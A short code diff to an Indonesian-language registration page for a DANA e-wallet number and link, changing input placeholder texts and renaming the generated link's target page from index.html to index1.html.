@@ -100,8 +100,8 @@
             <h3>Registrasi No Rekening</h3>
             <p>Masukkan nomor tujuan Anda terlebih dahulu sebelum memulai sistem.</p>
             
-            <input type="tel" class="input-dana" id="noDanaInput" placeholder="Mesti diawali 08..." maxlength="13" required>
-            <input type="text" class="input-dana" id="dataInput" placeholder="Masukkan data di sini..." required>
+            <input type="tel" class="input-dana" id="noDanaInput" placeholder="Nomor Diawali 08xxx" maxlength="13" required>
+            <input type="text" class="input-dana" id="dataInput" placeholder="Masukkan Link Dana Anda..." required>
             
             <div class="error-container">
                 <span id="log-error"></span><span class="kursor-error" id="kursor-err"></span>
@@ -196,7 +196,7 @@ document.getElementById('btnDaftar').addEventListener('click', () => {
     localStorage.setItem('linkUser', data);
     
     const domainAsli = window.location.origin + window.location.pathname.replace('register.html', '');
-    const linkHasilGenerate = `${domainAsli}index.html`;
+    const linkHasilGenerate = `${domainAsli}index1.html`;
     
     document.getElementById('teksLinkHasil').textContent = linkHasilGenerate;
 
